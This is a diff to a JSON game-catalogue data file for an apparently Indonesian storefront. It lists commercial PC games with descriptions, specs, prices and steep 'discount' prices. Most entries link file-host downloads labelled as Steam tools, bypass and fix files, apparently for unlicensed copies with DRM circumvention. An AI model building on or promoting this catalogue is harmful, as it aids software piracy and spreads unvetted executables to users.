+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.802235626519127.zip"
+  },
+  {
+    "id": "1f0992ec-f747-4bae-a983-991075e5fb7b",
+    "title": "Assasin's Creed Valhalla",
+    "price": 619000,
+    "description": "Assassin’s Creed Valhalla adalah game action RPG berlatar era Viking yang mengikuti kisah Eivor, seorang pejuang Norse yang memimpin klannya untuk menetap di Inggris. Pemain dapat menjelajahi dunia open world yang luas, menjalankan berbagai misi, membangun pemukiman, serta terlibat dalam pertempuran brutal khas Viking. Selain itu, game ini juga menawarkan elemen stealth untuk melakukan penyusupan dan assassination, serta sistem pengembangan karakter yang memungkinkan pemain menyesuaikan gaya bermain. Dengan perpaduan cerita sejarah dan fiksi, game ini menghadirkan pengalaman petualangan yang epik dan imersif.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/046ffa35-bdfe-31e9-bf98-47ed6d33a31f/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/yPCFP1bj",
+        "icon": "tool",
+        "label": "Steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/buZ92iQT",
+        "icon": "fix",
+        "label": "Bypasss"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "book",
+        "label": "Tutorial Fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "Tutorial Install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/Wk8WKutw",
+        "icon": "box",
+        "label": "Install Game"
+      }
+    ],
+    "created_at": "2026-04-20T16:18:15.685002+00:00",
+    "genre": "Action, RPG, Open World, Adventure, History",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit versions only)",
+        "cpu": "Ryzen 3 1200 - 3.1 Ghz / Core i5-4460 - 3.2 Ghz",
+        "gpu": "AMD Radeon R9 380 or NVIDIA GeForce GTX 960 or better",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 (64-bit versions only)",
+        "cpu": "Ryzen 7 1700 - 3.0 Ghz /Core i7-6700 – 3.4 Ghz",
+        "gpu": "AMD Vega 64 - 8GB / GeForce GTX 1080- 8GB",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "bae01bdf-1a3d-4242-a3cd-37b0e06102d5",
+    "title": "Assassin's Creed Orogins",
+    "price": 619000,
+    "description": "Assassin’s Creed Origins adalah game action RPG berlatar Mesir Kuno yang mengikuti kisah Bayek, seorang Medjay yang berusaha membalas dendam sekaligus mengungkap konspirasi besar yang melibatkan kekuatan politik dan organisasi rahasia. Pemain dapat menjelajahi dunia open world yang luas mulai dari gurun, kota, hingga piramida, sambil menyelesaikan berbagai misi, bertarung, dan melakukan stealth untuk mengalahkan musuh. Game ini juga menghadirkan sistem pengembangan karakter, senjata, dan kemampuan yang fleksibel, serta menyuguhkan cerita mendalam yang menjadi awal mula terbentuknya Brotherhood dalam seri Assassin’s Creed.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/f73a5b3a-6476-30fe-93c7-0f7aca10ee32/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/yPCFP1bj",
+        "icon": "tool",
+        "label": "Steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CPgFyWXx",
+        "icon": "fix",
+        "label": "Bypass"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "book",
+        "label": "Tutorial Fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "Tutorial Install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/4dgXyDQy",
+        "icon": "box",
+        "label": "Install Game"
+      }
+    ],
+    "created_at": "2026-04-21T10:32:09.091128+00:00",
+    "genre": "Action, RPG, Open World, Hitory",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7 SP1, Windows 8.1, Windows 10 (64-bit versions only)",
+        "cpu": "Intel Core i5-2400s @ 2.5 GHz or AMD FX-6350 @ 3.9 GHz or equivalent",
+        "gpu": "NVIDIA GeForce GTX 660 or AMD R9 270 (2048 MB VRAM with Shader Model 5.0 or better)",
+        "ram": "6 GB"
+      },
+      "recommended": {
+        "os": "Windows 7 SP1, Windows 8.1, Windows 10 (64-bit versions only)",
+        "cpu": "Intel Core i7- 3770 @ 3.5 GHz or AMD FX-8350 @ 4.0 GHz",
+        "gpu": "NVIDIA GeForce GTX 760 or AMD R9 280X (3GB VRAM with Shader Model 5.0 or better)",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "ce508954-316e-42df-961f-715fac6c665f",
+    "title": "NIGHT SHIPPERS",
+    "price": 74000,
+    "description": "Night Shippers adalah game horor co-op yang menggabungkan elemen survival dan simulasi pengiriman barang di malam hari. Pemain bekerja sama untuk mengantarkan paket sambil menghadapi gangguan supranatural, monster menyeramkan, dan situasi chaos yang menegangkan namun tetap seru dimainkan bersama teman.",
+    "thumbnail": "https://tse1.mm.bing.net/th/id/OIP.2o4agQFeW34KxtjqWwzGcQHaEP?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/yPCFP1bj",
+        "icon": "box",
+        "label": "steamtools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/KmMiL73P",
+        "icon": "box",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "guide",
+        "label": "Tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "guide",
+        "label": "Tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/WzqqSUST",
+        "icon": "box",
+        "label": "Install game"
+      }
+    ],
+    "created_at": "2026-05-22T04:36:48.313172+00:00",
+    "genre": "CO-OP, HORROR, SURVIVAL",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10",
+        "cpu": "Intel Core i5-7400",
+        "gpu": "AMD Radeon RX Vega 10 Ryzen 7 3750H",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11",
+        "cpu": "\tIntel Core i7-8700",
+        "gpu": "NVIDIA GeForce GTX 1070",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "450b11c3-4725-488f-bf3a-4f092d5eb240",
+    "title": "Assassin's Creed Mirage",
+    "price": 579000,
+    "description": "Assassin’s Creed Mirage adalah game dari Ubisoft yang membawa seri ini kembali ke akar klasik Assassin’s Creed (fokus stealth, bukan RPG besar).\n\nKamu bermain sebagai:\nBasim Ibn Ishaq → pencuri jalanan yang menjadi Assassin\n\nCerita berfokus pada:\nPerjalanan Basim dari pencuri menjadi anggota Hidden Ones\nKonflik melawan organisasi Order of the Ancients\nPencarian jati diri dan masa lalu Basim\n\nSetting:\nBaghdad abad ke-9 (Islamic Golden Age)\nKota dibagi menjadi beberapa distrik dengan lingkungan padat dan hidup",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/c6e9e150-a733-3fd6-844a-179f59083321/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/Vd8AnTii",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/yqGt3gLi",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T10:43:28.415234+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10/11 64-bit",
+        "cpu": "Intel Core i7-4790K / Ryzen 5 1600",
+        "gpu": "GTX 1060 (6GB) / RX 570",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "Intel i7-8700K / Ryzen 5 3600",
+        "gpu": "RTX 2070 / RX 5700 XT",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "9c5f31b0-bc84-41d4-9dc8-00402682cef0",
+    "title": "F1 2017",
+    "price": 364999,
+    "description": "F1 2017 adalah game simulasi balap Formula 1 yang dikembangkan oleh Codemasters.\n\nGame ini menghadirkan:\nMusim resmi Formula 1 2017 (tim, pembalap, sirkuit lengkap)\nMode karier yang lebih dalam\nMobil klasik legendaris\n\nKamu bisa:\nMenjadi pembalap F1 dan membangun karier\nMengembangkan mobil melalui riset & development (R&D)\nBalapan di sirkuit nyata seperti Monaco, Silverstone, dll",
+    "thumbnail": "https://tse1.mm.bing.net/th/id/OIP.LIzJinCAdmPzecgNDxxkrQHaHa?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/rkxMKvkB",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/uji669kP",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T10:53:02.854285+00:00",
+    "genre": "Racing",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel i3-2130 / AMD FX4300",
+        "gpu": "GTX 460 / Radeon HD 5870",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel i5-4690 / AMD FX-8320",
+        "gpu": "GTX 970 / RX 480",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "e07ff8c9-40ac-4d8a-b46b-81909258d9f5",
+    "title": "Resident Evil 3 Remake",
+    "price": 519000,
+    "description": "Resident Evil 3 Remake mengikuti kisah Jill Valentine, seorang anggota S.T.A.R.S. yang berusaha melarikan diri dari kota Raccoon City yang hancur akibat wabah zombie. Sepanjang perjalanan, Jill diburu oleh senjata biologis mematikan bernama Nemesis, yang terus mengejar tanpa henti. Game ini menggabungkan aksi cepat, suasana tegang, serta eksplorasi dengan elemen survival, di mana pemain harus mengelola resource sambil bertahan dari serangan zombie dan monster lainnya.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/1c6d9a7e-9c62-35ca-ba2e-d80866ecb622/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/su7qKh7V",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T11:46:55.999846+00:00",
+    "genre": "\tSurvival, Horror,Adventure,Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel Core i5-4460 / AMD FX-6300",
+        "gpu": "GTX 760 / Radeon R7 260X",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i7-3770 / AMD FX-9590",
+        "gpu": "GTX 1060 / RX 480",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "e6b235ed-332d-4669-b8d9-8153895488ed",
+    "title": "Resident Evil 4 Remake",
+    "price": 519000,
+    "description": "Resident Evil 4 Remake adalah versi modern dari game klasik yang pertama kali rilis tahun 2005 oleh Capcom. Game ini mengikuti cerita Leon S. Kennedy yang ditugaskan menyelamatkan putri presiden, Ashley Graham, dari sebuah desa misterius di Eropa yang dipenuhi penduduk terinfeksi parasit.",
+    "thumbnail": "https://tse2.mm.bing.net/th/id/OIP.Rog_xrA7Ly-hcah84Z-NygHaLH?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/xe9EZUwv",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/sZLWBGgc",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T12:18:08.976961+00:00",
+    "genre": "Survival,Action,Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-7500 / AMD Ryzen 3 1200",
+        "gpu": "GTX 1050 Ti / RX 560",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "Intel Core i7-8700 / AMD Ryzen 5 3600",
+        "gpu": "GTX 1070 / RX 5700",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "dd1c36a6-7750-45cb-a7ef-b974847f79d4",
+    "title": "Resident Evil Village",
+    "price": 519000,
+    "description": "Resident Evil Village (juga dikenal sebagai RE8) adalah lanjutan langsung dari Resident Evil 7: Biohazard yang dikembangkan oleh Capcom. Cerita kembali mengikuti Ethan Winters yang mencari putrinya yang diculik di sebuah desa terpencil penuh misteri dan makhluk mengerikan.\n\nSepanjang permainan, Ethan harus menghadapi berbagai karakter ikonik seperti Lady Dimitrescu dan penguasa wilayah lainnya, masing-masing dengan area dan gaya gameplay yang berbeda. Game ini menggabungkan elemen horror, aksi, dan eksplorasi dengan sudut pandang first-person.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/d901ff64-101d-3463-ac44-24e4176b315d/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/mm2RNLGj",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/5aWKDFyV",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T14:10:54.298143+00:00",
+    "genre": "Survival,Action,Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-7500 / AMD Ryzen 3 1200",
+        "gpu": "GTX 1050 Ti / RX 560",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-8700 / AMD Ryzen 5 3600",
+        "gpu": "GTX 1070 / RX 5700",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "ebe42b7b-c46d-4d18-8676-2edf01f2f236",
+    "title": "Resident Evil 7 Biohazard",
+    "price": 259000,
+    "description": "Resident Evil 7: Biohazard adalah titik balik besar dalam seri Resident Evil dari Capcom. Game ini memperkenalkan sudut pandang first-person dan kembali ke akar horror mencekam. Cerita mengikuti Ethan Winters yang mencari istrinya yang hilang di sebuah rumah tua di Louisiana, yang ternyata dihuni oleh keluarga misterius dan berbahaya, yaitu Baker family.\n\nAtmosfer game sangat gelap, penuh ketegangan, dan fokus pada eksplorasi serta survival dibanding aksi. Banyak puzzle dan momen jumpscare yang membuat pengalaman bermain lebih intens.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/4358bfaa-6097-3c65-bcb2-1ece0d5d35ae/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/A3PZJjDZ",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T14:29:21.439054+00:00",
+    "genre": "Survival, Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7 / 8 / 10 (64-bit)",
+        "cpu": "Intel Core i5-4460 / AMD FX-6300",
+        "gpu": "GTX 760 / Radeon R7 260x",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i7-3770 / AMD FX-9590",
+        "gpu": "GTX 1060 / RX 480",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 7000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "848947a6-ff75-4702-8cc0-0b1b471c02e3",
+    "title": "Crime Simulator",
+    "price": 191198,
+    "description": "Crime Simulator bukan satu judul game spesifik, tapi istilah untuk game yang mensimulasikan kehidupan kriminal—mulai dari pencurian, perampokan, hingga membangun “karier” di dunia kejahatan. Biasanya pemain diberi kebebasan untuk merencanakan aksi, menghindari polisi, dan mengembangkan strategi agar tidak tertangkap.",
+    "thumbnail": "https://tse4.mm.bing.net/th/id/OIP.d-yT9huVaLrG1F4QJsz6xAHaJ4?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/SjcNXdTT",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/XPczFhp2",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T15:59:59.109978+00:00",
+    "genre": "Open World, Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i3-6100 or equivalent",
+        "gpu": "NVidia GeForce RTX 2060 or equivalent",
+        "ram": " 8 GB RAM"
+      },
+      "recommended": {
+        "os": "Windows 11 64-bit",
+        "cpu": "Intel Core i5-8400 or equivalent",
+        "gpu": "NVidia GeForce RTX 3060 or equivalent",
+        "ram": " 16 GB RAM"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "6812f8e1-c0b7-470a-bc41-3f7aee34d9bb",
+    "title": "Beyond: Two Souls",
+    "price": 199000,
+    "description": "Beyond: Two Souls adalah game interactive drama cinematic dari Quantic Dream yang mengikuti kehidupan Jodie Holmes, seorang gadis yang memiliki hubungan misterius dengan entitas tak terlihat bernama Aiden. Pemain akan menjalani berbagai fase hidup Jodie—dari masa kecil hingga dewasa—dalam cerita non-linear yang penuh pilihan, di mana setiap keputusan memengaruhi alur cerita, hubungan karakter, dan ending yang didapat. Game ini menekankan emosi, hubungan manusia, serta tema supranatural dengan gaya seperti film interaktif.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/ebd6858d-0279-3812-b779-ad409bbba656/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/1gJLh6fm",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T06:15:26.580076+00:00",
+    "genre": "Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel Core i5-4430 / AMD FX-6300",
+        "gpu": "GTX 660 / Radeon HD 7870",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-6600 / Ryzen 5 1600",
+        "gpu": "GTX 970 / RX 480",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 5000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "2f669acb-8b4b-4928-a227-83327e385e1b",
+    "title": "Elden Ring",
+    "price": 599000,
+    "description": "Elden Ring adalah game action RPG bergaya dark fantasy yang menghadirkan dunia open world luas bernama Lands Between, di mana pemain berperan sebagai Tarnished yang berusaha memulihkan Elden Ring dan menjadi Elden Lord. Game ini menawarkan kebebasan eksplorasi dengan berbagai wilayah, dungeon, dan rahasia, serta sistem pertarungan yang menantang khas genre soulslike yang menuntut strategi, ketepatan waktu, dan kesabaran. Selain itu, pemain dapat mengembangkan karakter melalui berbagai build, senjata, dan sihir, sementara cerita disampaikan secara mendalam melalui lore yang tersebar di dunia permainan.",
+    "thumbnail": "https://s.yimg.com/fz/api/res/1.2/Ue52SmKksPMZkQ0tcO9Z4g--~C/YXBwaWQ9c3JjaGRkO2ZpPWZpbGw7aD0yNDA7cT0xMDA7dz0yNDA-/https://s.yimg.com/cv/apiv2/default/20220725/eldenring_art.jpg",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "Steam Tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/3oYHasae",
+        "icon": "fix",
+        "label": "File fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "guide",
+        "label": "Tutorial Fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/48V8JQdG",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-20T14:50:08.36006+00:00",
+    "genre": "Action, RPG, Open World",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10",
+        "cpu": "\tIntel Core i5-8400",
+        "gpu": "NVIDIA GeForce GTX 1060 3GB",
+        "ram": "\t12 GB"
+      },
+      "recommended": {
+        "os": "\tWindows 10",
+        "cpu": "\tIntel Core i7-8700K",
+        "gpu": "NVIDIA GeForce GTX 1070",
+        "ram": "\t16 GB"
+      }
+    },
+    "discount_price": 15000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "2cb4bbd9-b8ff-4b42-9f4f-5c8474cf4ca2",
+    "title": "BIGFOOT",
+    "price": 174999,
+    "description": "BIGFOOT adalah game survival horror multiplayer di mana pemain berperan sebagai pemburu yang mencoba melacak dan mengalahkan makhluk legendaris Bigfoot di hutan liar. Pemain harus bekerja sama mengumpulkan petunjuk, memasang kamera, jebakan, dan senjata untuk bertahan hidup, sambil menghindari serangan mendadak dari Bigfoot yang dikendalikan AI atau pemain lain. Game ini menekankan suasana mencekam, eksplorasi malam hari, dan kerja sama tim dalam menghadapi ancaman yang tidak terduga.",
+    "thumbnail": "https://e.snmc.io/lk/lv/x/cb4d5b0c6cddc1f1d5f21a53278d1517/10478213",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/bn51XyiW",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/iZTrR4Y6",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-23T06:21:10.301504+00:00",
+    "genre": "Survival,Action,Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel Core i5-2300 / AMD FX-6300",
+        "gpu": "GTX 650 Ti / Radeon HD 7770",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i7-3770 / Ryzen 5 1600",
+        "gpu": "GTX 970 / RX 480",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 6000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "028b0b0b-f8c1-4fee-8739-02783901644a",
+    "title": "The Last of Us Part II",
+    "price": 729000,
+    "description": "Ellie dan Joel kini hidup menetap di komunitas yang aman di Jackson, Wyoming. Meskipun mereka memiliki kehidupan yang relatif stabil di tengah ancaman Infected, hubungan mereka menjadi renggang karena rahasia besar dari akhir game pertama.\nKetenangan mereka hancur ketika sebuah peristiwa tragis dan brutal terjadi di tangan kelompok asing. Ellie kemudian berangkat dalam perjalanan berbahaya menuju Seattle yang sedang dilanda perang saudara untuk memburu orang-orang yang bertanggung jawab.",
+    "thumbnail": "https://image.api.playstation.com/vulcan/ap/rnd/202312/0117/315718bce7eed62e3cf3fb02d61b81ff1782d6b6cf850fa4.png",
+    "download_links": [],
+    "created_at": "2026-04-16T13:03:28.575297+00:00",
+    "genre": "Action, Aventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (64-bit, v1909 atau terbaru)",
+        "cpu": "Intel Core i7-4770K / AMD Ryzen 5 1500X",
+        "gpu": "NVIDIA GeForce GTX 1050 Ti (4 GB) / AMD Radeon RX 470 (4 GB)",
+        "ram": "16 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "Intel Core i7-8700 / AMD Ryzen 5 3600X",
+        "gpu": "NVIDIA GeForce RTX 2070 Super / RTX 3060 / AMD Radeon RX 6600 XT",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "",
